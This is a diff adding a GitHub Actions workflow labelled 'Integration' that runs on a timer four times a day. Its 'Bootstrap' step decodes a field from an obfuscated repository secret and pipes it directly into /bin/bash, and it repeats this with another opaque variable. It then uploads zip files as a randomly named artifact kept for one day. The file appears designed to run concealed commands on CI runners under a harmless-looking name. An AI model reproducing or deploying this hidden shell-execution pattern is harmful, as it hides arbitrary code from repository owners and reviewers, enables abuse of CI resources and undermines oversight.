@@ -1,0 +1,32 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '6 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          r9355: ${{ secrets.r9355 }}
+        run: |
+          printf '%s' "$r9355" | jq -r .u34752 | /bin/bash
+          echo $xn0 | jq -r .mbkr6413 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: dBtY0XzR
+          path: "*.zip"
+          retention-days: 1
